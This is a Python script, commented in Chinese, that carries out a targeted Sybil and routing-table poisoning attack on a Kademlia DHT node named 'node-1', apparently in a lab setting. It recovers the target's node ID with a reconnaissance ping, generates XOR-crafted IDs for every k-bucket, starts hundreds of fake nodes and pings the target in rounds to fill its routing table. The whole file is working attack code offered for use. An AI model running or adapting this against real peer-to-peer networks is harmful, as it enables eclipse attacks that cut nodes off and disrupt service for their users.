import asyncio
import logging
import random
import socket
from kademlia.node import Node
from kademlia.utils import ID_BITS

# --- 攻击配置 ---
TARGET_HOSTNAME = "node-1"  # 攻击目标
TARGET_PORT = 8000
ATTACK_NODES_PER_BUCKET = 8  # 每个桶生成的攻击节点数量 (由用户指定 6-8 个)
START_PORT = 9000  # 攻击节点起始监听端口

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
logger = logging.getLogger("SmartSybil")


async def get_target_id(target_ip, target_port):
    """
    侦察阶段：启动一个临时节点 Ping 目标，从回复中提取目标的真实 NodeID
    """
    logger.info("🕵️ Starting Reconnaissance to steal Target ID...")

    # 创建临时侦察节点
    recon_node = Node(random.getrandbits(32), START_PORT - 1)
    await recon_node.start()

    target_contact = {'id': 0, 'ip': target_ip, 'port': target_port}

    # 发送 Ping。Kademlia 协议在收到 Pong 后会自动将发送者加入路由表
    is_alive = await recon_node.protocol.ping(target_contact)

    target_id = None
    if is_alive:
        # 遍历路由表查找目标 IP，获取其真实 ID
        for bucket in recon_node.routing_table.buckets:
            for contact in bucket:
                if contact['ip'] == target_ip and contact['port'] == target_port:
                    target_id = contact['id']
                    break
            if target_id: break

    # 关闭侦察节点释放端口
    # 注意：这里没有显式的 stop 方法，但在 Python 脚本结束或对象销毁时 socket 会释放
    # 实际生产代码中应添加 recon_node.protocol.transport.close()
    if recon_node.protocol.transport:
        recon_node.protocol.transport.close()

    return target_id


def generate_targeted_id(target_id, bit_index):
    """
    生成一个特定的 ID，使其必然落在目标的第 bit_index 号桶中。
    逻辑：AttackID = TargetID XOR (1 << bit_index) XOR RandomNoise
    """
    # 1. 翻转第 bit_index 位，确保距离的最高位 (MSB) 在这里
    # 这保证了 bucket_index = bit_index
    prefix_mask = (1 << bit_index)

    # 2. 生成低位噪声 (0 到 2^bit_index - 1)，确保 ID 唯一且不改变 bucket 归属
    # 如果 bit_index 为 0，没有更低的位，噪声只能是 0
    if bit_index > 0:
        noise = random.getrandbits(bit_index)
    else:
        noise = 0

    # 3. 组合
    return target_id ^ prefix_mask ^ noise


async def create_sybil_node(node_id, port):
    node = Node(node_id, port)
    await node.start()
    return node


async def run_attack():
    # 1. 解析目标 IP
    try:
        target_ip = socket.gethostbyname(TARGET_HOSTNAME)
        logger.info(f"🎯 Target IP Resolved: {target_ip}")
    except Exception as e:
        logger.error(f"❌ Failed to resolve target: {e}")
        return

    # 2. 获取目标 NodeID
    target_id = await get_target_id(target_ip, TARGET_PORT)
    if target_id is None:
        logger.error("❌ Failed to retrieve Target ID. Is the target online?")
        return

    logger.info(f"🔓 Target ID Acquired: {target_id:08x} (Dec: {target_id})")
    logger.info("😈 Calculating attack vectors...")

    sybils = []
    current_port = START_PORT

    # 3. 生成针对性攻击节点
    # 遍历每一个 bit (即遍历目标的每一个 k-bucket)
    # 32位 ID 对应 32 个桶 (Bucket 0 到 Bucket 31)
    for i in range(ID_BITS):
        logger.info(f"  -> Generating {ATTACK_NODES_PER_BUCKET} nodes for Bucket #{i}")

        for _ in range(ATTACK_NODES_PER_BUCKET):
            # 生成特定的 ID
            attack_id = generate_targeted_id(target_id, i)

            # 启动节点
            node = await create_sybil_node(attack_id, current_port)
            sybils.append(node)
            current_port += 1

            # 为了防止瞬间并发过高导致丢包，每启动 10 个稍微歇一下
            if len(sybils) % 50 == 0:
                await asyncio.sleep(0.1)

    logger.info(f"✅ Deployment Complete. {len(sybils)} Sybil nodes are active.")
    logger.info("🚀 Starting Liveness Checks & Routing Table Poisoning...")

    target_contact = {'id': target_id, 'ip': target_ip, 'port': TARGET_PORT}

    # 4. 持续攻击循环 (维持活性)
    # 修改为有限次数的攻击，防止脚本永不退出
    attack_rounds = 3  # 攻击3轮，每轮20秒，共60秒
    for round_num in range(attack_rounds):
        sent_count = 0
        for node in sybils:
            try:
                # 向目标发送 Ping。目标收到后会尝试将我们加入对应的 Bucket。
                # 因为我们的 ID 是精心构造的，我们会精准地填充它所有的 Bucket。
                asyncio.create_task(node.protocol.ping(target_contact))
                sent_count += 1

                # 简单的流控
                if sent_count % 100 == 0:
                    await asyncio.sleep(0.2)
            except Exception:
                pass

        logger.info(f"⚡ Round {round_num + 1}/{attack_rounds}: Pulse sent from {len(sybils)} nodes.")

        # 等待20秒再发送下一轮
        if round_num < attack_rounds - 1:
            await asyncio.sleep(20)
    
    logger.info(f"🎯 Attack completed! Total {len(sybils)} Sybil nodes have poisoned the target.")
    logger.info("💤 Keeping nodes alive for 30 seconds to ensure route table stability...")
    await asyncio.sleep(30)
    
    # 关闭所有节点释放端口
    logger.info("🧹 Cleaning up...")
    for node in sybils:
        try:
            if node.protocol.transport:
                node.protocol.transport.close()
        except:
            pass
    
    logger.info("✅ Attack script finished successfully.")


if __name__ == '__main__':
    try:
        asyncio.run(run_attack())
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user.")
    except Exception as e:
        logger.error(f"Attack failed: {e}")